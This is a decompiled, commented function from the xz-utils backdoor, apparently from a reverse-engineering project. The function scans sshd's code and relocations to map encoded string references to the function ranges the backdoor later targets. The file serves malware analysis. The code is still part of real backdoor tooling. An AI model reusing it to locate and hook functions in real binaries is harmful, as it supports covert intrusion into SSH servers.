// /home/kali/xzre-ghidra/xzregh/102D30_elf_build_string_xref_table.c
// Function: elf_build_string_xref_table @ 0x102D30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_build_string_xref_table(elf_info_t * elf_info, string_references_t * refs)


/*
 * AutoDoc: Populates the 27-entry `string_references_t` table that anchors every sshd heuristic.
 * It seeds each slot with its fixed `EncodedStringId`, scrapes `.rodata` with `elf_find_encoded_string_in_rodata`, and latches the first LEA that materialises every literal via `find_string_lea_xref`.
 * The routine then decodes `.text` start-to-finish with `x86_decode_instruction`, shrinking each `[func_start, func_end)` around CALLs, PLT/JMPs, and RIP-relative LEAs that hit the recorded xrefs, and finally folds in RELA/RELR relocation hits plus code-segment bounds so the resulting ranges are trustworthy and always executable.
 */

#include "xzre_types.h"

BOOL elf_build_string_xref_table(elf_info_t *elf_info,string_references_t *refs)

{
  void **range_table_end;
  u8 *xref_site;
  void *slot_reloc;
  EncodedStringId string_id_seed;
  BOOL insn_decoded;
  dasm_ctx_t *slot_lower_bound;
  char *string_cursor;
  u8 *xref_instruction;
  void **range_slot;
  u8 *candidate_addr;
  Elf64_Rela *rela_slot;
  dasm_ctx_t *scratch_ctx;
  u64 entry_offset;
  string_references_t *entry_cursor;
  u8 *text_segment_end;
  void **range_cursor;
  u8 *decode_cursor;
  EncodedStringId string_id_cursor;
  u64 code_segment_size;
  ulong local_88;
  dasm_ctx_t scanner_ctx;
  
  string_id_seed = STR_xcalloc_zero_size;
  entry_cursor = refs;
  do {
    // AutoDoc: Pre-seed every slot with the encoded literal it should track before the heavy scans begin.
    (entry_cursor->xcalloc_zero_size).string_id = string_id_seed;
    string_id_seed = string_id_seed + 8;
    entry_cursor = (string_references_t *)&entry_cursor->chdir_home_error;
  // AutoDoc: Sweep the relocation tables too so GOT/PLT slots that touch the literal keep the enclosing range in view.
  } while (string_id_seed != 0xe8);
  scratch_ctx = &scanner_ctx;
  // AutoDoc: Zero the scratch decoder before scanning `.text` so each pointer hunt starts from a clean state.
  for (entry_offset = 0x16; entry_offset != 0; entry_offset = entry_offset + -1) {
    *(u32 *)&scratch_ctx->instruction = 0;
    scratch_ctx = (dasm_ctx_t *)((long)&scratch_ctx->instruction + 4);
  }
  code_segment_size = 0;
  local_88 = 0;
  slot_lower_bound = (dasm_ctx_t *)elf_get_text_segment(elf_info,&code_segment_size);
  scratch_ctx = &scanner_ctx;
  if ((slot_lower_bound != (dasm_ctx_t *)0x0) && (0x10 < code_segment_size)) {
    text_segment_end = (u8 *)slot_lower_bound + code_segment_size;
    string_cursor = (char *)0x0;
    while( TRUE ) {
      string_id_cursor = 0;
      string_cursor = elf_find_encoded_string_in_rodata(elf_info,&string_id_cursor,string_cursor);
      if (string_cursor == (char *)0x0) break;
      entry_offset = 0;
      do {
        if (((*(long *)((long)&(refs->xcalloc_zero_size).xref + entry_offset) == 0) &&
            (*(EncodedStringId *)((long)&(refs->xcalloc_zero_size).string_id + entry_offset) == string_id_cursor))
           // AutoDoc: Record the first LEA/MOV that materialises each literal so the later range tightening has an anchor.
           && (xref_instruction = find_string_lea_xref((u8 *)slot_lower_bound,(u8 *)text_segment_end,string_cursor),
              xref_instruction != (u8 *)0x0)) {
          *(u8 **)((long)&(refs->xcalloc_zero_size).xref + entry_offset) = xref_instruction;
        }
        entry_offset = entry_offset + 0x20;
      } while (entry_offset != 0x360);
      string_cursor = string_cursor + 1;
    }
    range_cursor = &(refs->xcalloc_zero_size).func_start;
    range_table_end = &refs[1].xcalloc_zero_size.func_start;
    range_slot = range_cursor;
    do {
      decode_cursor = (dasm_ctx_t *)range_slot[2];
      if (decode_cursor != (dasm_ctx_t *)0x0) {
        if (slot_lower_bound <= decode_cursor) {
          if ((dasm_ctx_t *)*range_slot < slot_lower_bound) {
            *range_slot = slot_lower_bound;
          }
          if (slot_lower_bound != decode_cursor) goto LAB_00102e58;
        }
        if (slot_lower_bound <= (dasm_ctx_t *)((long)range_slot[1] - 1U)) {
          range_slot[1] = slot_lower_bound;
        }
      }
LAB_00102e58:
      range_slot = range_slot + 4;
      decode_cursor = slot_lower_bound;
    } while (range_slot != range_table_end);
LAB_00102e64:
    if (decode_cursor < text_segment_end) {
      // AutoDoc: Walk the entire text range with the decoder, tightening function bounds whenever a CALL/JMP/LEA targets our xrefs.
      insn_decoded = x86_decode_instruction(scratch_ctx,(u8 *)decode_cursor,(u8 *)text_segment_end);
      decode_cursor = decode_cursor + 1;
      if (insn_decoded != FALSE) {
        decode_cursor = scanner_ctx.instruction + scanner_ctx.instruction_size;
        if (*(u32 *)&scanner_ctx.opcode_window[3] == 0x168) {
          if (scanner_ctx.imm_signed == 0) goto LAB_00102e64;
          candidate_addr = decode_cursor + scanner_ctx.imm_signed;
LAB_00102ee5:
          if (candidate_addr == (dasm_ctx_t *)0x0) goto LAB_00102e64;
        }
        else {
          candidate_addr = scanner_ctx.instruction;
          if (*(u32 *)&scanner_ctx.opcode_window[3] == 0xa5fe) goto LAB_00102ee5;
          if (((*(u32 *)&scanner_ctx.opcode_window[3] != 0x10d) || ((scanner_ctx.prefix.modrm_bytes.rex_byte & 0x48) != 0x48)
              ) || (((uint)scanner_ctx.prefix.decoded.modrm & 0xff00ff00) != 0x5000000))
          goto LAB_00102e64;
          candidate_addr = decode_cursor + scanner_ctx.mem_disp;
        }
        if ((slot_lower_bound <= candidate_addr) && (range_slot = range_cursor, candidate_addr <= text_segment_end)) {
          do {
            xref_site = (dasm_ctx_t *)range_slot[2];
            if (xref_site != (dasm_ctx_t *)0x0) {
              if (candidate_addr <= xref_site) {
                if ((dasm_ctx_t *)*range_slot < candidate_addr) {
                  *range_slot = candidate_addr;
                }
                if (xref_site != candidate_addr) goto LAB_00102f31;
              }
              if (candidate_addr <= (dasm_ctx_t *)((long)range_slot[1] - 1U)) {
                range_slot[1] = candidate_addr;
              }
            }
LAB_00102f31:
            range_slot = range_slot + 4;
          } while (range_slot != range_table_end);
        }
      }
      goto LAB_00102e64;
    }
    while (rela_slot = elf_rela_find_relative_slot
                               (elf_info,(void *)0x0,(u8 *)slot_lower_bound,(u8 *)text_segment_end,
                                &local_88), range_slot = range_cursor, rela_slot != (Elf64_Rela *)0x0) {
      do {
        slot_reloc = (Elf64_Rela *)range_slot[2];
        if (slot_reloc != (Elf64_Rela *)0x0) {
          if (rela_slot <= slot_reloc) {
            if ((Elf64_Rela *)*range_slot < rela_slot) {
              *range_slot = rela_slot;
            }
            if (rela_slot != slot_reloc) goto LAB_00102f8e;
          }
          if (rela_slot <= (Elf64_Rela *)((long)range_slot[1] - 1U)) {
            range_slot[1] = rela_slot;
          }
        }
LAB_00102f8e:
        range_slot = range_slot + 4;
      } while (range_slot != range_table_end);
    }
    do {
      scratch_ctx = (dasm_ctx_t *)range_cursor[2];
      if (scratch_ctx != (dasm_ctx_t *)0x0) {
        // AutoDoc: Clamp any straggling ranges/xrefs back inside `.text` so later scans cannot wander past executable memory.
        if (text_segment_end <= scratch_ctx) {
          if ((dasm_ctx_t *)*range_cursor < text_segment_end) {
            *range_cursor = text_segment_end;
          }
          if (scratch_ctx != text_segment_end) goto LAB_00102fad;
        }
        scratch_ctx = (dasm_ctx_t *)((long)range_cursor[1] + -1);
        if (text_segment_end <= scratch_ctx) {
          range_cursor[1] = text_segment_end;
        }
      }
LAB_00102fad:
      range_cursor = range_cursor + 4;
    } while (range_cursor != range_table_end);
  }
  return ((slot_lower_bound != (dasm_ctx_t *)0x0) && (0x10 < code_segment_size));
}

